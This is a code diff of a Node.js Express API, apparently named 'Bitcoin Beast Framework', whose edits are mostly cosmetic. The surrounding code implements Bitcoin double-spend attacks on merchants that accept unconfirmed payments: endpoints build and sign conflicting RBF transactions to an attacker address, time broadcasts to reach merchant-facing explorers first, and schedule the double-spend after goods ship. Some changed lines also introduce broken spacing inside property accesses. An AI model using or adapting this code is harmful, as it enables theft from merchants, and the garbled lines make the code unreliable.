@@ -5,7 +5,7 @@ const bitcoin = require('bitcoinjs-lib');
 const ecc = require('tiny-secp256k1');
 const { BIP32Factory } = require('bip32');
 const axios = require('axios');
-const crypto = require('crypto'); // Built-in Node.js crypto - no npm package needed
+const crypto = require('crypto');
 const morgan = require('morgan');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
@@ -21,7 +21,7 @@ const bip32 = BIP32Factory(ecc);
 app.use(helmet({ crossOriginResourcePolicy: false }));
 app.use(morgan('dev'));
 
-// CORS Configuration - FIXED:  More restrictive for production
+// CORS Configuration - More restrictive for production
 const allowedOrigins = [
   'http://localhost:3000',
   'http://localhost:3001',
@@ -57,7 +57,7 @@ app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ limit: '10mb', extended: true }));
 app.set('trust proxy', true);
 
-// ======== STATIC FILE SERVING - FIXED ========
+// ======== STATIC FILE SERVING ========
 app.use(express.static(path.join(__dirname, 'public'), {
   maxAge: '1h',
   etag: false,
@@ -79,7 +79,7 @@ const MEMPOOL_APIS = {
   mainnet: 'https://mempool.space/api',
 };
 
-// ======== SWAGGER DOCUMENTATION - FIXED ========
+// ======== SWAGGER DOCUMENTATION ========
 const getSwaggerSpec = () => {
   const baseUrl = process.env.NODE_ENV === 'production' && process.env.RENDER_EXTERNAL_URL
     ? process. env.RENDER_EXTERNAL_URL
@@ -91,10 +91,10 @@ const getSwaggerSpec = () => {
       title: 'Bitcoin Beast Framework API',
       version: '1.0.0',
       description: 'Testnet/mainnet double-spend testing, fee attack simulation, merchant 0-conf risk assessment.  For DEFENSIVE and EDUCATIONAL USE ONLY.',
-      contact: { name: 'sweetpie66rtrr' },
+      contact: { name: 'sweetpie2929' },
     },
     servers: [{ url: baseUrl, description: 'API Server' }],
-    paths:  {
+    paths: {
       '/api/final-sequence-attack': { post: { summary: 'Simulate final-sequence and RBF attack', tags: ['Attacks'] }},
       '/api/smart-fee-booster': { post: { summary:  'Fetch smart attack fee strategy', tags: ['Analysis'] }},
       '/api/merchant-targeted-broadcast': { post: { summary: 'Broadcast TX to merchant nodes', tags: ['Broadcast'] }},
@@ -115,7 +115,7 @@ const getSwaggerSpec = () => {
 
 app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(null, {
   swaggerOptions: {
-    url:  '/swagger-spec.json',
+    url: '/swagger-spec.json',
   }
 }));
 
@@ -124,7 +124,7 @@ app.get('/swagger-spec.json', (req, res) => {
   res.json(getSwaggerSpec());
 });
 
-// ======== RATE LIMITING - FIXED ========
+// ======== RATE LIMITING ========
 const limiter = rateLimit({
   windowMs: 10 * 60 * 1000, // 10 minutes
   max: 20, // 20 requests per window
@@ -211,12 +211,12 @@ app.post('/api/final-sequence-attack', (req, res) => {
         txid: tx1.getId(),
         hex: tx1.toHex(),
         destination: victim_address,
-        sequence: '0xffffffff (won\'t opt-in to RBF)',
+        sequence:  '0xffffffff (won\'t opt-in to RBF)',
         fee: tx1_fee,
         broadcast_target: 'merchant_nodes',
       },
       tx_attacker: {
-        txid: tx2.getId(),
+        txid:  tx2.getId(),
         hex: tx2.toHex(),
         destination: attacker_address,
         sequence: '0xfffffffe (RBF enabled)',
@@ -229,7 +229,7 @@ app.post('/api/final-sequence-attack', (req, res) => {
         'Broadcast new TX (RBF), higher fee > wins mempool > miners confirm.',
         'TX1 appears in mempool but is replaced, so merchant cheated.',
       ],
-      merchant_belief:  'Payment received (TX1 in mempool)',
+      merchant_belief: 'Payment received (TX1 in mempool)',
       reality:  'TX2 confirms, TX1 orphaned.',
     });
   } catch (error) {
@@ -248,7 +248,7 @@ app.post('/api/smart-fee-booster', async (req, res) => {
     const current_fees = {
       fastest: fees.fastestFee,
       half_hour: fees.halfHourFee,
-      hour: fees. hourFee,
+      hour: fees.hourFee,
     };
     const smart_fee = Math.max(current_fees. fastest * 1.2, target_fee_rate);
 
@@ -316,7 +316,7 @@ app.post('/api/merchant-targeted-broadcast', async (req, res) => {
       broadcast_results: results,
       broadcast_settings: {
         delay_ms: 500,
-        detail: 'Deliberately deliver to merchant-facing explorers before mining pools.',
+        detail:  'Deliberately deliver to merchant-facing explorers before mining pools.',
       }
     });
   } catch (error) {
@@ -426,7 +426,7 @@ app.post('/api/identical-inputs-exploit', (req, res) => {
       transactions.push({
         utxo_index: utxo_idx,
         inputs: {
-          shared_txid: utxo.txid, shared_vout: utxo. vout, shared_value: utxo.value
+          shared_txid: utxo.txid, shared_vout: utxo.vout, shared_value: utxo.value
         },
         tx_merchant: {
           txid: tx1.getId(), hex: tx1.toHex(), output: merchant_address, fee:  3000
@@ -459,12 +459,12 @@ app.post('/api/time-window-exploit', (req, res) => {
         { t: 2, action: 'Wait for merchant webhook' },
         { t: 30, action: 'Verify order shipped/fulfilled' },
         { t: merchant_payment_window_minutes * 60, action: 'Broadcast attacker double-spend to miners' },
-        { t:  merchant_payment_window_minutes * 60 + 600, action: 'Double-spend confirms; merchant TX invalid' },
+        { t: merchant_payment_window_minutes * 60 + 600, action: 'Double-spend confirms; merchant TX invalid' },
       ],
       exploit_conditions: [
         'Merchant accepts 0-conf and auto-fulfills.',
         'Merchant does not double-spend check.',
-        `Fulfillment is instant (digital/dropship), no further checks.`
+        `Fulfillment is instant (digital/dropship), no further checks. `
       ],
       vulnerability: 'Merchant ships product on 0-conf, giving attacker time window.',
     });
@@ -482,7 +482,7 @@ app.post('/api/webhook-vulnerability-scanner', async (req, res) => {
     }
 
     const webhook_payloads = [
-      { name: 'mempool_detection', payload: { txid: test_payload_txid, confirmations: 0, status: 'unconfirmed' }, risk: 'Accepts 0-conf' },
+      { name: 'mempool_detection', payload: { txid: test_payload_txid, confirmations: 0, status: 'unconfirmed' }, risk:  'Accepts 0-conf' },
       { name: 'first_confirmation', payload: { txid: test_payload_txid, confirmations: 1, status: 'confirmed' }, risk: 'No re-org check' },
       { name: 'address_balance_change', payload: { address: 'test_address', balance_change: 10000, confirmations: 0 }, risk:  'Counts unconfirmed in balance' },
     ];
@@ -537,11 +537,11 @@ app.post('/api/execute-full-attack', async (req, res) => {
     // Merchant TX
     const psbt1 = new bitcoin.Psbt({ network: net })
       .addInput({
-        hash: utxo. txid,
+        hash: utxo.txid,
         index: utxo.vout,
         sequence: 0xffffffff,
-        witnessUtxo:  {
-          script: bitcoin.address.toOutputScript(merchant_address, net),
+        witnessUtxo: {
+          script:  bitcoin.address.toOutputScript(merchant_address, net),
           value: utxo.value,
         },
       })
@@ -555,17 +555,17 @@ app.post('/api/execute-full-attack', async (req, res) => {
     // Attacker TX
     const psbt2 = new bitcoin.Psbt({ network: net })
       .addInput({
-        hash: utxo.txid,
+        hash: utxo. txid,
         index: utxo.vout,
         sequence: 0xfffffffe,
-        witnessUtxo: {
-          script: bitcoin. address.toOutputScript(attacker_address, net),
+        witnessUtxo:  {
+          script: bitcoin.address.toOutputScript(attacker_address, net),
           value: utxo.value,
         },
       })
       .addOutput({
         address: attacker_address,
-        value:  utxo.value - 5000,
+        value: utxo.value - 5000,
       });
     psbt2.signInput(0, keyPair).finalizeAllInputs();
     const tx2 = psbt2.extractTransaction();
@@ -602,7 +602,7 @@ app.post('/api/execute-full-attack', async (req, res) => {
   }
 });
 
-// ========== ROUTE MOUNTING - FIXED ========
+// ========== ROUTE MOUNTING ========
 // Import wallet routes
 const walletRoutes = require('./example-express-wallet-routes');
 const walletGenRoutes = require('./routes/wallet-gen');
@@ -620,10 +620,10 @@ app.get('/health', (req, res) => {
   res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
-// ========== ERROR HANDLERS - FIXED ========
+// ========== ERROR HANDLERS ========
 // 404 handler
 app.use((req, res) => {
-  res.status(404).json({ 
+  res.status(404).json({
     error: 'Route not found',
     path: req.path,
     method: req.method,
@@ -634,18 +634,24 @@ app.use((req, res) => {
 app.use((err, req, res, next) => {
   console.error('❌ Unhandled Error:', err);
   
-  res.status(err.status || 500).json({
-    error: process.env.NODE_ENV === 'production' 
-      ? 'Internal server error' 
-      : err. message,
+  const errorResponse = {
+    error: process.env.NODE_ENV === 'production'
+      ? 'Internal server error'
+      : err.message,
     code: err.code || 'UNKNOWN',
     path: req.path,
-    .. .(process.env.NODE_ENV !== 'production' && { stack:  err.stack }),
-  });
+  };
+
+  // Only include stack trace in development
+  if (process.env.NODE_ENV !== 'production') {
+    errorResponse.stack = err.stack;
+  }
+
+  res.status(err.status || 500).json(errorResponse);
 });
 
-// ===== SERVER INITIALIZATION - FIXED =====
-const PORT = process.env.PORT || 3000;
+// ===== SERVER INITIALIZATION =====
+const PORT = process. env.PORT || 3000;
 const NODE_ENV = process.env.NODE_ENV || 'development';
 
 const server = app.listen(PORT, () => {
